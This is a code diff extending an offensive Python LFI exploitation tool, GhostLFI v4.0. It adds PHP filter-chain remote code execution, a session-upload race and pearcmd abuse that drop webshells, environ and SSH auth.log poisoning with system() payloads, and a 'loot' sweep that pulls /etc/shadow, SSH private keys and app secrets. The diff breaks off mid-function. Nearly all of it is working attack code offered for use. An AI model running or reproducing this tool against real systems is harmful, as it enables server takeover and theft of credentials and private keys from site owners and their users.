@@ -34,6 +34,75 @@ warnings.filterwarnings('ignore', message='Unverified HTTPS request')
 
 init(autoreset=True)
 
+# PHP filter-chain conversions table -- from Synacktiv's
+# php_filter_chain_generator (MIT, github.com/synacktiv/php_filter_chain_generator)
+FILTER_CHAIN_CONVERSIONS = {'0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
+ '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4',
+ '2': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921',
+ '3': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE',
+ '4': 'convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE',
+ '5': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2',
+ '6': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2',
+ '7': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4',
+ '8': 'convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
+ '9': 'convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB',
+ 'A': 'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213',
+ 'a': 'convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE',
+ 'B': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000',
+ 'b': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE',
+ 'C': 'convert.iconv.UTF8.CSISO2022KR',
+ 'c': 'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2',
+ 'D': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213',
+ 'd': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5',
+ 'E': 'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT',
+ 'e': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937',
+ 'F': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB',
+ 'f': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213',
+ 'g': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8',
+ 'G': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90',
+ 'H': 'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213',
+ 'h': 'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE',
+ 'I': 'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213',
+ 'i': 'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000',
+ 'J': 'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4',
+ 'j': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16',
+ 'K': 'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE',
+ 'k': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2',
+ 'L': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC',
+ 'l': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE',
+ 'M': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T',
+ 'm': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949',
+ 'N': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4',
+ 'n': 'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61',
+ 'O': 'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775',
+ 'o': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE',
+ 'P': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB',
+ 'p': 'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4',
+ 'q': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2',
+ 'Q': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2',
+ 'R': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4',
+ 'r': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101',
+ 'S': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS',
+ 's': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90',
+ 'T': 'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103',
+ 't': 'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS',
+ 'U': 'convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943',
+ 'u': 'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61',
+ 'V': 'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB',
+ 'v': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2',
+ 'W': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936',
+ 'w': 'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE',
+ 'X': 'convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932',
+ 'x': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS',
+ 'Y': 'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361',
+ 'y': 'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT',
+ 'Z': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16',
+ 'z': 'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937',
+ '/': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4',
+ '+': 'convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157',
+ '=': ''}
+
+
 
 class UltimateLFIExploiter:
     """The only LFI tool you'll ever need - everything integrated"""
@@ -47,6 +116,18 @@ class UltimateLFIExploiter:
         self.rce_method = None
         self.config_status = {}
         self.successful_methods = []
+        # v2 state
+        self.target_os = 'unknown'
+        self.loot_dir = os.path.join(os.getcwd(), 'ghostlfi_loot',
+                                     urllib.parse.urlparse(target_url).hostname or 'target')
+        self.inject_cookie = None    # e.g. "lang=GHOST" -- payload goes in cookie
+        self.inject_header = None    # e.g. "X-Forwarded-For: GHOST"
+        self.inject_data = None      # e.g. "page=GHOST&submit=1" (POST body)
+        self._fc_exec_chain = None
+        self.dropped_shell = None
+        self.environ_target = None
+        self.authlog_target = None
+        self.unc_path = None
         
         # LFI test paths
         self.lfi_paths = [
@@ -106,7 +187,7 @@ class UltimateLFIExploiter:
 
 {Fore.YELLOW}[*] Target URL: {Fore.WHITE}{self.target_url}{Style.RESET_ALL}
 {Fore.YELLOW}[*] Parameter:  {Fore.WHITE}{self.parameter}{Style.RESET_ALL}
-{Fore.YELLOW}[*] Version:    {Fore.WHITE}3.7 - URL Encoding Fixed (PHAR/ZIP Working){Style.RESET_ALL}
+{Fore.YELLOW}[*] Version:    {Fore.WHITE}4.0 - Filter-Chain RCE, Session Race, pearcmd, environ/auth-log, Loot Harvest, Cookie/Header Injection{Style.RESET_ALL}
 """
         print(banner)
 
@@ -2403,7 +2484,34 @@ $phar->stopBuffering();
     def execute_command(self, command: str) -> str:
         """Execute command using the discovered RCE method"""
         try:
-            if self.rce_method == 'expect':
+            if self.rce_method == 'filter_chain':
+                r = self._send_payload(self._fc_exec_chain,
+                                       extra_params={'c': command}, timeout=25)
+                m = re.search(r'GFCS([\s\S]*?)GFCE', r.text)
+                return m.group(1) if m else r.text
+
+            elif self.rce_method == 'dropped_shell':
+                r = self._send_payload(self.dropped_shell,
+                                       extra_params={'cmd': command}, timeout=20)
+                return r.text
+
+            elif self.rce_method == 'environ':
+                self.session.headers['User-Agent'] = '<?php system($_GET["c"]); ?>'
+                r = self._send_payload(self.environ_target,
+                                       extra_params={'c': command}, timeout=20)
+                return r.text
+
+            elif self.rce_method == 'authlog':
+                r = self._send_payload(self.authlog_target,
+                                       extra_params={'c': command}, timeout=20)
+                return r.text
+
+            elif self.rce_method == 'unc':
+                r = self._send_payload(self.unc_path,
+                                       extra_params={'cmd': command}, timeout=25)
+                return r.text
+
+            elif self.rce_method == 'expect':
                 payload = f'expect://{urllib.parse.quote(command)}'
                 response = self._send_payload(payload)
                 return response.text
@@ -2620,20 +2728,40 @@ $phar->stopBuffering();
         
         # Phase 1: Config
         self.check_php_config()
-        
-        # Phase 2: LFI Test
-        self.test_basic_lfi()
-        
+
+        # Phase 2: LFI Test + target fingerprint
+        if not self.test_basic_lfi():
+            self.test_blind_lfi()
+        self.detect_os_and_stack()
+
+        # Phase 2.5: source disclosure (secrets even without RCE)
+        self.test_source_disclosure()
+
         # Phase 3: Wrappers (HTB order)
         if self.test_expect_wrapper():
             return True
-        
+
         if self.test_data_wrapper():
             return True
-        
+
         if self.test_php_input_wrapper():
             return True
-        
+
+        # Phase 3.5: filter-chain RCE -- works with allow_url_include=Off,
+        # no uploads, no logs; the modern default LFI2RCE
+        if self.test_filter_chain_rce():
+            return True
+
+        # Phase 3.6: no-precondition droppers
+        if self.test_session_upload_race():
+            return True
+
+        if self.test_pearcmd():
+            return True
+
+        if self.test_environ_poisoning():
+            return True
+
         # Phase 3.4: RFI Test
         print(f"\n{Fore.CYAN}[*] Testing Remote File Inclusion (RFI)...{Style.RESET_ALL}")
         rfi_possible = self.test_rfi_vulnerability()
@@ -2647,10 +2775,16 @@ $phar->stopBuffering();
             
             if self.test_log_poisoning():
                 return True
-            
+
             if self.test_session_poisoning():
                 return True
-        
+
+            if self.test_auth_log_poisoning():
+                return True
+
+        # No RCE -- still walk away with the target's secrets
+        self.harvest_loot()
+
         print(f"\n{Fore.RED}{'='*60}")
         print(f"[FAIL] No RCE method successful")
         print(f"{'='*60}{Style.RESET_ALL}")
@@ -2663,14 +2797,500 @@ $phar->stopBuffering();
 
     # ==================== UTILITIES ====================
     
-    def _send_payload(self, payload: str, method: str = 'GET', data: str = None, timeout: int = 10) -> requests.Response:
-        """Send payload to target"""
+    # ==================== v2.0 METHODS ====================
+    # New enumeration & exploitation methods: PHP filter-chain RCE (no file
+    # write, works with allow_url_include=Off), php://filter source
+    # disclosure, loot harvesting, OS/stack detection, blind-LFI oracle,
+    # PHP_SESSION_UPLOAD_PROGRESS race, pearcmd argv injection,
+    # /proc/self/environ + fd poisoning, SSH auth.log poisoning,
+    # phpinfo() tmp-file race, SMB/UNC inclusion for Windows targets.
+
+    def generate_filter_chain(self, php_code: str) -> str:
+        """Build a php://filter iconv chain that makes include() execute
+        arbitrary PHP with NO file on disk and allow_url_include=Off.
+        Technique: loknop / Synacktiv php_filter_chain_generator (MIT)."""
+        b64 = base64.b64encode(php_code.encode()).decode().replace('=', '')
+        filters = "convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|"
+        for c in b64[::-1]:
+            filters += FILTER_CHAIN_CONVERSIONS[c] + "|"
+            filters += "convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|"
+        filters += "convert.base64-decode"
+        return f"php://filter/{filters}/resource=php://temp"
+
+    def test_filter_chain_rce(self) -> bool:
+        """PHP filter chain RCE -- the modern LFI2RCE. Repeatable, needs only
+        include() of a controlled string; no uploads, wrappers or logs."""
+        print(f"\n{Fore.CYAN}[TEST] PHP Filter Chain RCE (iconv chains){Style.RESET_ALL}")
+        marker = f"GHOSTFC{int(time.time()) % 100000}"
+        try:
+            chain = self.generate_filter_chain(f'<?php echo "{marker}"; ?>')
+            r = self._send_payload(chain, timeout=20)
+            if marker in r.text:
+                print(f"{Fore.GREEN}[✓] Filter chain executes PHP! (marker {marker} echoed){Style.RESET_ALL}")
+                # persistent primitive: chain embedding system($_GET[c])
+                self._fc_exec_chain = self.generate_filter_chain(
+                    '<?php echo "GFCS"; system($_GET["c"]); echo "GFCE"; ?>')
+                self.rce_method = 'filter_chain'
+                self.successful_methods.append('PHP filter chain (iconv) RCE')
+                return True
+            print(f"{Fore.RED}[✗] Filter chain not executed (include() may prepend/append paths){Style.RESET_ALL}")
+        except Exception as e:
+            print(f"{Fore.RED}[✗] Filter chain error: {e}{Style.RESET_ALL}")
+        return False
+
+    def read_file(self, path: str, timeout: int = 12) -> str:
+        """Best-effort file read: plain LFI, traversal, then php://filter
+        base64 (survives include() executing the PHP inside the file)."""
+        for payload in (path, '../' * 8 + path.lstrip('/'),
+                        f'php://filter/convert.base64-encode/resource={path}'):
+            try:
+                r = self._send_payload(payload, timeout=timeout)
+                body = r.text
+                if payload.startswith('php://filter'):
+                    m = re.search(r'[A-Za-z0-9+/=]{24,}', body)
+                    if m:
+                        try:
+                            return base64.b64decode(m.group(0)).decode('utf-8', 'replace')
+                        except Exception:
+                            continue
+                elif r.status_code == 200 and len(body) and not self._looks_like_miss(body):
+                    return body
+            except Exception:
+                continue
+        return ""
+
+    def test_source_disclosure(self) -> bool:
+        """php://filter/convert.base64-encode source read of the vulnerable
+        script itself + neighbors -- hunts secrets in the app source."""
+        print(f"\n{Fore.CYAN}[TEST] Source Disclosure via php://filter{Style.RESET_ALL}")
+        page = self.target_url.rstrip('/').rsplit('/', 1)[-1] or 'index.php'
+        targets = [page, 'index.php', 'config.php', 'configuration.php', 'db.php',
+                   'database.php', 'settings.php', 'wp-config.php', 'connect.php',
+                   '.env', 'composer.json']
+        hits = 0
+        for t in targets:
+            src = ""
+            try:
+                r = self._send_payload(f'php://filter/convert.base64-encode/resource={t}', timeout=12)
+                m = re.search(r'[A-Za-z0-9+/=]{40,}', r.text)
+                if m:
+                    src = base64.b64decode(m.group(0)).decode('utf-8', 'replace')
+            except Exception:
+                continue
+            if src and ('<?' in src or 'DB_' in src or '=' in src[:200]):
+                hits += 1
+                self._save_loot(f'source_{t.replace("/", "_")}', src)
+                print(f"{Fore.GREEN}[✓] Source disclosed: {t} ({len(src)} bytes){Style.RESET_ALL}")
+                for line in src.splitlines():
+                    if re.search(r'(passw|secret|api[_-]?key|token|DB_|mysqli?_connect|PDO\()', line, re.I):
+                        print(f"    {Fore.YELLOW}{line.strip()[:110]}{Style.RESET_ALL}")
+        if hits:
+            self.successful_methods.append(f'php://filter source disclosure ({hits} files)')
+            return True
+        print(f"{Fore.RED}[✗] No source disclosed (filters may be blocked){Style.RESET_ALL}")
+        return False
+
+    LOOT_FILES = [
+        '/etc/passwd', '/etc/shadow', '/etc/hosts', '/etc/crontab',
+        '/etc/mysql/my.cnf', '/etc/mysql/debian.cnf', '/etc/ssh/sshd_config',
+        '/proc/self/cmdline', '/proc/self/environ', '/proc/version',
+        '/proc/net/tcp', '/proc/net/fib_trie',
+        '/var/www/html/config.php', '/var/www/html/wp-config.php',
+        '/var/www/html/.env', '/var/www/.env', '/var/www/html/configuration.php',
+        '/var/www/html/sites/default/settings.php',
+        '/opt/lampp/etc/httpd.conf', '/etc/apache2/apache2.conf',
+        '/etc/apache2/sites-enabled/000-default.conf', '/etc/nginx/nginx.conf',
+        '/etc/nginx/sites-enabled/default', '/usr/local/etc/php/php.ini',
+        'C:/Windows/win.ini', 'C:/Windows/System32/drivers/etc/hosts',
+        'C:/inetpub/wwwroot/web.config', 'C:/xampp/php/php.ini',
+        'C:/Windows/repair/SAM', 'C:/Users/Administrator/.ssh/id_rsa',
+        '../WEB-INF/web.xml', '../../WEB-INF/web.xml',
+    ]
+
+    def harvest_loot(self) -> int:
+        """Systematic sensitive-file sweep. Parses /etc/passwd to derive
+        per-user targets (SSH keys, histories). Flags credential material."""
+        print(f"\n{Fore.CYAN}{'='*60}\n[LOOT] Sensitive File Harvest\n{'='*60}{Style.RESET_ALL}")
+        got = 0
+        users = []
+        passwd = self.read_file('/etc/passwd')
+        if passwd and 'root:' in passwd:
+            self._save_loot('etc_passwd', passwd)
+            got += 1
+            for line in passwd.splitlines():
+                parts = line.split(':')
+                if len(parts) >= 7 and parts[6].endswith(('sh',)) and parts[5].startswith('/home'):
+                    users.append((parts[0], parts[5]))
+            print(f"{Fore.GREEN}[✓] /etc/passwd -> shell users: {', '.join(u for u, _ in users) or 'none'}{Style.RESET_ALL}")
+        targets = list(self.LOOT_FILES)
+        for user, home in users[:8]:
+            targets += [f'{home}/.ssh/id_rsa', f'{home}/.ssh/id_ed25519',
+                        f'{home}/.ssh/authorized_keys', f'{home}/.bash_history',
+                        f'{home}/.mysql_history', f'{home}/user.txt']
+        for path in targets:
+            data = self.read_file(path)
+            if not data or self._looks_like_miss(data):
+                continue
+            got += 1
+            tag = path.replace('/', '_').replace(':', '').replace('\\', '_').strip('_')
+            self._save_loot(tag, data)
+            flags = []
+            if re.search(r'PRIVATE KEY-----', data):
+                flags.append('SSH/TLS PRIVATE KEY')
+            if re.search(r'(passw(or)?d|secret|api[_-]?key)\s*[=:]', data, re.I):
+                flags.append('credentials')
+            if re.search(r'\$[0-9a-z]+\$[^:]+:', data) or re.search(r'^\w+:\$', data, re.M):
+                flags.append('password hashes')
+            note = f"  {Fore.RED}<<< {', '.join(flags)}{Style.RESET_ALL}" if flags else ""
+            print(f"{Fore.GREEN}[✓] {path} ({len(data)} bytes){note}")
+        print(f"\n{Fore.CYAN}[*] {got} files looted -> {self.loot_dir}{Style.RESET_ALL}")
+        if got:
+            self.successful_methods.append(f'file harvest ({got} files)')
+        return got
+
+    def detect_os_and_stack(self) -> str:
+        """Fingerprint target OS/stack through what the LFI can read."""
+        print(f"\n{Fore.CYAN}[ENUM] OS / Stack Detection{Style.RESET_ALL}")
+        probes = [
+            ('/etc/passwd', r'root:.*:0:0', 'linux'),
+            ('C:/Windows/win.ini', r'(\[fonts\]|\[extensions\])', 'windows'),
+            ('C:\\Windows\\win.ini', r'(\[fonts\]|\[extensions\])', 'windows'),
+            ('../WEB-INF/web.xml', r'<web-app', 'java'),
+            ('/proc/version', r'Linux version', 'linux'),
+        ]
+        for path, rx, osname in probes:
+            try:
+                r = self._send_payload(path, timeout=8)
+                if re.search(rx, r.text):
+                    self.target_os = osname
+                    print(f"{Fore.GREEN}[✓] Target identified: {osname} (read {path}){Style.RESET_ALL}")
+                    if osname == 'windows':
+                        print(f"{Fore.YELLOW}[*] Windows: try --smb-rfi <LHOST> (UNC include + NTLM capture){Style.RESET_ALL}")
+                    if osname == 'java':
+                        print(f"{Fore.YELLOW}[*] Java stack: harvesting WEB-INF/web.xml; try ..;/ bypasses{Style.RESET_ALL}")
+                    return osname
+            except Exception:
+                continue
+        print(f"{Fore.YELLOW}[?] OS not identified (blind LFI? try --test-blind){Style.RESET_ALL}")
+        self.target_os = 'unknown'
+        return 'unknown'
+
+    def test_blind_lfi(self) -> bool:
+        """Boolean/diff oracle for blind LFI: compare responses for a file
+        that must exist vs one that cannot, plus error-signature scan."""
+        print(f"\n{Fore.CYAN}[TEST] Blind LFI Oracle (diff + error signatures){Style.RESET_ALL}")
+        sigs = [r'include\(\)', r'failed to open stream', r'Failed opening',
+                r'java\.io\.FileNotFoundException', r'ENOENT', r'no such file',
+                r'open_basedir restriction', r'Warning.*require']
+        try:
+            miss = self._send_payload('/ghostlfi_nonexistent_zz', timeout=10)
+            for pair in (('/etc/passwd', '/etc/passwdZZ'),
+                         ('C:/Windows/win.ini', 'C:/Windows/winZZ.ini')):
+                hit = self._send_payload(pair[0], timeout=10)
+                hit2 = self._send_payload(pair[1], timeout=10)
+                if abs(len(hit.text) - len(hit2.text)) > 50 or hit.status_code != hit2.status_code:
+                    print(f"{Fore.GREEN}[✓] Blind oracle: {pair[0]} differs from control "
+                          f"({len(hit.text)}B vs {len(hit2.text)}B) -- inclusion happens{Style.RESET_ALL}")
+                    self.successful_methods.append('blind LFI (response-diff oracle)')
+                    return True
+            for s in sigs:
+                if re.search(s, miss.text, re.I):
+                    print(f"{Fore.GREEN}[✓] Inclusion error leaked: /{s}/ -- LFI confirmed (blind){Style.RESET_ALL}")
+                    self.successful_methods.append(f'blind LFI (error signature {s})')
+                    return True
+        except Exception as e:
+            print(f"{Fore.RED}[✗] {e}{Style.RESET_ALL}")
+        print(f"{Fore.RED}[✗] No blind-LFI signal{Style.RESET_ALL}")
+        return False
+
+    def test_session_upload_race(self) -> bool:
+        """LFI2RCE via PHP_SESSION_UPLOAD_PROGRESS: no login, no upload dir.
+        Threads spray a session containing PHP while we race the include of
+        sess_<id> before PHP cleans it."""
+        print(f"\n{Fore.CYAN}[TEST] PHP_SESSION_UPLOAD_PROGRESS Race{Style.RESET_ALL}")
+        import threading
+        sid = f"ghostlfi{int(time.time()) % 99999}"
+        marker = f"GSUP{sid[-5:]}"
+        payload_php = (f'{marker}<?php file_put_contents("/tmp/.ghostlfi.php",'
+                       f'base64_decode("{base64.b64encode(self.webshells["request"].encode()).decode()}"));'
+                       f' echo "DROPPED"; ?>')
+        sess_paths = ['/var/lib/php/sessions/sess_' + sid, '/tmp/sess_' + sid,
+                      '/var/lib/php5/sess_' + sid, '/var/lib/php7/sess_' + sid,
+                      '/var/lib/php/session/sess_' + sid]
+
+        # phase 1: one throwaway upload creates an (empty, cleaned) session
+        # file -- oracle which candidate path exists at all
+        try:
+            self.session.post(self.target_url, proxies=self.proxy, timeout=8,
+                              cookies={'PHPSESSID': sid},
+                              data={'PHP_SESSION_UPLOAD_PROGRESS': 'probe'},
+                              files={'f': ('g.txt', b'x')})
+        except Exception:
+            pass
+        target_path = None
+        try:
+            miss = self._send_payload('/ghostlfi_nonexistent_zz', timeout=6)
+            for sp in sess_paths:
+                r = self._send_payload(sp, timeout=6)
+                if (r.status_code, len(r.text)) != (miss.status_code, len(miss.text)) \
+                        and not self._looks_like_miss(r.text):
+                    target_path = sp
+                    print(f"{Fore.GREEN}[+] Session file path found: {sp}{Style.RESET_ALL}")
+                    break
+        except Exception:
+            pass
+        hammer_paths = [target_path] if target_path else sess_paths[:2]
+
+        # phase 2: sprayers push BIG multipart bodies (long server-side
+        # processing = wide race window) while hammer threads include the file
+        stop = {'found': False, 'won_path': ''}
+        big = b'x' * 2_000_000
+
+        def spray():
+            while not stop['found']:
+                try:
+                    self.session.post(self.target_url, proxies=self.proxy, timeout=15,
+                                      cookies={'PHPSESSID': sid},
+                                      data={'PHP_SESSION_UPLOAD_PROGRESS': payload_php},
+                                      files={'f': ('g.txt', big)})
+                except Exception:
+                    pass
+
+        def hammer(sp):
+            while not stop['found']:
+                try:
+                    r = self._send_payload(sp, timeout=4)
+                    if marker in r.text or 'DROPPED' in r.text:
+                        stop['found'] = True
+                        stop['won_path'] = sp
+                        return
+                except Exception:
+                    pass
+
+        threads = [threading.Thread(target=spray, daemon=True) for _ in range(4)]
+        threads += [threading.Thread(target=hammer, args=(sp,), daemon=True)
+                    for sp in hammer_paths for _ in range(4)]
+        for t in threads:
+            t.start()
+        deadline = time.time() + 30
+        while time.time() < deadline and not stop['found']:
+            time.sleep(0.3)
+        stop['found'] = True
+        time.sleep(0.5)
+        if stop['won_path']:
+            print(f"{Fore.GREEN}[✓] Session race WON: included {stop['won_path']}{Style.RESET_ALL}")
+            if self._adopt_dropped_shell('/tmp/.ghostlfi.php'):
+                self.successful_methods.append('PHP_SESSION_UPLOAD_PROGRESS race')
+                return True
+            self.successful_methods.append('PHP_SESSION_UPLOAD_PROGRESS race (exec-once)')
+            return True
+        print(f"{Fore.RED}[✗] Race lost (upload_progress off, cleaned too fast, or paths differ){Style.RESET_ALL}")
+        return False
+
+    def test_pearcmd(self) -> bool:
+        """pearcmd.php argv injection (register_argc_argv=On, common in PHP
+        docker images): config-create writes a webshell we then include."""
+        print(f"\n{Fore.CYAN}[TEST] pearcmd.php argv Injection{Style.RESET_ALL}")
+        pear_paths = ['/usr/local/lib/php/pearcmd.php', '/usr/share/php/pearcmd.php',
+                      '/usr/lib/php/pearcmd.php']
+        shell = '<?=system($_REQUEST["cmd"]);?>'
+        for pear in pear_paths:
+            try:
+                url = (f"{self.target_url}?{urllib.parse.quote(self.parameter)}="
+                       f"{urllib.parse.quote(pear)}&+config-create+/"
+                       f"{urllib.parse.quote(shell, safe='')}+/tmp/ghostpear.php")
+                self.session.get(url, proxies=self.proxy, timeout=10)
+                r = self._send_payload('/tmp/ghostpear.php', extra_params={'cmd': 'echo GPEAR$((41+1))'})
+                if 'GPEAR42' in r.text:
+                    print(f"{Fore.GREEN}[✓] pearcmd RCE via {pear}!{Style.RESET_ALL}")
+                    self.rce_method = 'dropped_shell'
+                    self.dropped_shell = '/tmp/ghostpear.php'
+                    self.successful_methods.append('pearcmd.php config-create RCE')
+                    return True
+            except Exception:
+                continue
+        print(f"{Fore.RED}[✗] pearcmd not exploitable (no pear / register_argc_argv=Off){Style.RESET_ALL}")
+        return False
+
+    def test_environ_poisoning(self) -> bool:
+        """/proc/self/environ + /proc/self/fd/N poisoning via User-Agent."""
+        print(f"\n{Fore.CYAN}[TEST] /proc/self/environ + fd Poisoning{Style.RESET_ALL}")
+        marker = f"GENV{int(time.time()) % 99999}"
+        ua = f'<?php echo "{marker}"; system($_GET["c"] ?? ""); ?>'
+        old_ua = self.session.headers.get('User-Agent')
+        self.session.headers['User-Agent'] = ua
+        try:
+            targets = ['/proc/self/environ'] + [f'/proc/self/fd/{i}' for i in range(0, 25)]
+            for t in targets:
+                try:
+                    r = self._send_payload(t, timeout=8)
+                    if marker in r.text:
+                        print(f"{Fore.GREEN}[✓] Poisoned include via {t}!{Style.RESET_ALL}")
+                        self.rce_method = 'environ'
+                        self.environ_target = t
+                        self.successful_methods.append(f'environ/fd poisoning ({t})')
+                        return True
+                except Exception:
+                    continue
+        finally:
+            if old_ua:
+                self.session.headers['User-Agent'] = old_ua
+        print(f"{Fore.RED}[✗] environ/fd not includable (permissions/open_basedir){Style.RESET_ALL}")
+        return False
+
+    def test_auth_log_poisoning(self) -> bool:
+        """SSH auth.log poisoning: PHP in the SSH username lands in
+        /var/log/auth.log, then gets included. Needs readable auth.log."""
+        print(f"\n{Fore.CYAN}[TEST] SSH auth.log Poisoning{Style.RESET_ALL}")
+        host = urllib.parse.urlparse(self.target_url).hostname
+        try:
+            s = socket.create_connection((host, 22), timeout=5)
+            s.close()
+        except Exception:
+            print(f"{Fore.RED}[✗] {host}:22 closed -- skipping{Style.RESET_ALL}")
+            return False
+        marker = f"GAUTH{int(time.time()) % 99999}"
+        user = f'<?php echo "{marker}"; system($_GET["c"] ?? ""); ?>'
+        import subprocess as sp
+        try:
+            sp.run(['ssh', '-o', 'BatchMode=yes', '-o', 'StrictHostKeyChecking=no',
+                    '-o', 'ConnectTimeout=6', '-o', 'PreferredAuthentications=password,keyboard-interactive',
+                    f'{user}@{host}'], capture_output=True, timeout=15)
+        except Exception:
+            pass
+        time.sleep(2)
+        for log in ['/var/log/auth.log', '/var/log/secure', '/var/log/btmp']:
+            try:
+                r = self._send_payload(log, timeout=10)
+                if marker in r.text:
+                    print(f"{Fore.GREEN}[✓] auth.log poisoning works via {log}!{Style.RESET_ALL}")
+                    self.rce_method = 'authlog'
+                    self.authlog_target = log
